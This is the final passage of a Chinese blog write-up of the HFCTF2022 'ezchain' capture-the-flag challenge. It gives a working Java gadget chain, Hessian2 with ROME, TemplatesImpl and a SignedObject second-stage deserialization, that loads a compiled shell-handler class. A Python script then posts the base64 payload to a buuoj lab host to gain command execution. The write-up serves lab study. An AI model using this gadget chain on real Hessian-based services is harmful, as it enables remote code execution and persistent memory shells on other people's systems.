+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Hes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2_SignedObject</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;target/classes/Hes/shell_Handler.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//此处写法较为固定，用于初始化SignedObject类</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException,privateKey,signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean1);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean, equalsBean);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(Hessian2_Serial(hashMap))));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Hessian2_Serial(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        hessian2Output.writeObject(o);</span><br><span class="line">        hessian2Output.flushBuffer();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Hessian2_Deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hessian2Input.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>两个POC其实差不多</p>
+<p>但可能有些细节问题没有处理到位</p>
+<p>运行之后把得到的base64编码放入脚本中传上去</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">body = base64.b64decode(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line">requests.post(<span class="string">&quot;http://619a561c-46a5-4756-ab3a-430650cbc6ab.node5.buuoj.cn:81/?token=HFCTF200p&quot;</span>, data=body)</span><br></pre></td></tr></table></figure>
+<p>然后就能执行命令了</p>
+<p><img src="../images/image131825975.png" alt="image131825975" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/HashCode%E7%94%9F%E6%88%90/" rel="tag">HashCode生成</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Hessian2-rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">Hessian2+rome反序列化</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JAVA%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag">JAVA内存马</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JAVA%E5%AE%89%E5%85%A8/" rel="tag">JAVA安全</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/SignedObject%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">SignedObject二次反序列化</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/17369576223624.jpg" data-sizes="auto" alt="JAVA反序列化基础知识" class="lazyload">
+          
+        
+        <a href="/2025/08/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            JAVA反序列化基础知识
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/175514388679175514388612.jpg" data-sizes="auto" alt="[GKCTF 2021]babycat" class="lazyload">
+        
+      
+      <a href="/2025/07/31/%5BGKCTF%202021%5Dbabycat/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [GKCTF 2021]babycat
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text"> 源码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87hash%E6%A3%80%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text"> 绕过Hash检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">2.1.</span> <span class="toc-text"> 法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">2.2.</span> <span class="toc-text"> 法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hessian2%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text"> Hessian2二次反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">4.</span> <span class="toc-text"> 构造内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text"> 问题</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "[HFCTF2022]ezchain",
+          url: "http://example.com/2025/08/01/[HFCTF2022]ezchain/",
+          excerpt: "",
+          description: "",
+          stripContent: "猛攻！ 1234567891011121314151617181920212223242526272829docker-compose.ymlversion: &amp;#x27;2.4&amp;#x27;services:  nginx:    image: nginx:1.15    ports:      - &amp;quot;0.0.0.0:8090:80&amp;quot;    restart: always    volumes:        - ./nginx.conf:/etc/nginx/conf.d/",
+          date: "Fri Aug 01 2025 12:04:47 GMT+0800",
+          updated: "Fri Aug 01 2025 15:43:31 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
